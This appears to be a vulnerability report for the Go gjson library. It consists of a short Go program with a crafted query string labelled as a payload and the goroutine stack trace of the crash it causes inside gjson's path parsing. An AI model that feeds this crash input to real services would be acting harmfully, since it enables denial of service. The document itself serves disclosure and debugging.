payload:
func main() {
testJson := `0.#[[{}]].@valid:"000`
gjson.Get(testJson, testJson)
}

goroutine 1 [running]:
github.com/tidwall/gjson.squash(0xc0000124b1, 0x4, 0x4, 0xc0000124b2)
D:/Go/golibsrc/src/github.com/tidwall/gjson/gjson.go:501 +0x611
github.com/tidwall/gjson.execModifier(0xc000012485, 0x2, 0xc0000124aa, 0xb, 0xc00000a194, 0x4, 0x0, 0x1, 0x0)
D:/Go/golibsrc/src/github.com/tidwall/gjson/gjson.go:2568 +0x4fa
github.com/tidwall/gjson.Get(0xc000012485, 0x2, 0xc0000124aa, 0xb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
D:/Go/golibsrc/src/github.com/tidwall/gjson/gjson.go:1878 +0x138b
github.com/tidwall/gjson.Result.Get(0x5, 0xc000012485, 0x2, 0x0, 0x0, 0x0, 0x0, 0xc0000124aa, 0xb, 0x0, ...)
D:/Go/golibsrc/src/github.com/tidwall/gjson/gjson.go:297 +0x99
github.com/tidwall/gjson.parseArray.func2(0x5, 0xc000012485, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0)
D:/Go/golibsrc/src/github.com/tidwall/gjson/gjson.go:1382 +0x784
github.com/tidwall/gjson.parseArray(0xc000099da0, 0x5, 0xc0000124a2, 0x13, 0xc0000124a2, 0x13)
D:/Go/golibsrc/src/github.com/tidwall/gjson/gjson.go:1469 +0x23ac
github.com/tidwall/gjson.parseArray(0xc000099da0, 0x4, 0xc0000124a0, 0x15, 0x3c, 0x26)
D:/Go/golibsrc/src/github.com/tidwall/gjson/gjson.go:1483 +0xccb
github.com/tidwall/gjson.Get(0xc000012480, 0x15, 0xc0000124a0, 0x15, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
D:/Go/golibsrc/src/github.com/tidwall/gjson/gjson.go:1965 +0x353